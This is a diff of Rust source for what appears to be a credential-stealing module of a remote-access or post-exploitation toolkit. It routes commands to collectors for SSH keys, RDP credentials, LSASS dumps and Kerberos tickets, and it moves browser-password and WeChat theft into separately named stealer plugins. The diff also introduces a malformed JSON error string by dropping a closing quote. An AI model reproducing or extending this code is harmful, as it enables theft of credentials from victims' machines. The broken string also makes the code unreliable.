@@ -1,12 +1,11 @@
-//! Credentials cloud module — browsers, RDP, SSH, WeChat.
+//! Credentials cloud module — RDP, SSH (WeChat/browser live in plugins:
+//! com.libra.wechat-file / com.libra.browser-stealer).
 #![allow(non_snake_case)]
 #![allow(clippy::upper_case_acronyms)]
 
-mod browser_stealer;
-mod other_software;
 mod rdp_creds;
 mod ssh_keys;
-// lsass/kerberos 依赖 Windows 专属 FFI（browser_ffi/LSA），非 Windows 不编译。
+// lsass/kerberos 依赖 Windows 专属 FFI（lsass_ffi/LSA），非 Windows 不编译。
 #[cfg(target_os = "windows")]
 mod kerberos;
 #[cfg(target_os = "windows")]
@@ -42,18 +41,6 @@ fn dispatch(input: &str) -> String {
     let op = v.get("op").and_then(|o| o.as_str()).unwrap_or("");
 
     match op {
-        "browser" => {
-            let btype = v.get("type").and_then(|t| t.as_str()).unwrap_or("all");
-            let offset = v.get("offset").and_then(|o| o.as_u64()).unwrap_or(0) as usize;
-            let limit = v.get("limit").and_then(|l| l.as_u64()).unwrap_or(100) as usize;
-            browser_stealer::BrowserStealer::collect(btype, offset, limit)
-        }
-        "browser_search" => {
-            let btype = v.get("type").and_then(|t| t.as_str()).unwrap_or("all");
-            let keyword = v.get("keyword").and_then(|k| k.as_str()).unwrap_or("");
-            browser_stealer::BrowserStealer::search(btype, keyword)
-        }
-        "wechat" => other_software::OtherSoftware::collect_wechat(),
         "ssh" => ssh_keys::SshKeys::collect(),
         "rdp" => rdp_creds::RdpCreds::collect(),
         "lsass" => {
@@ -67,7 +54,7 @@ fn dispatch(input: &str) -> String {
             }
             #[cfg(not(target_os = "windows"))]
             {
-                r#"{"success":false,"error":"lsass dump not supported on this platform"}"#
+                r#"{"success":false,"error":"lsass dump not supported on this platform}"#
                     .to_string()
             }
         }
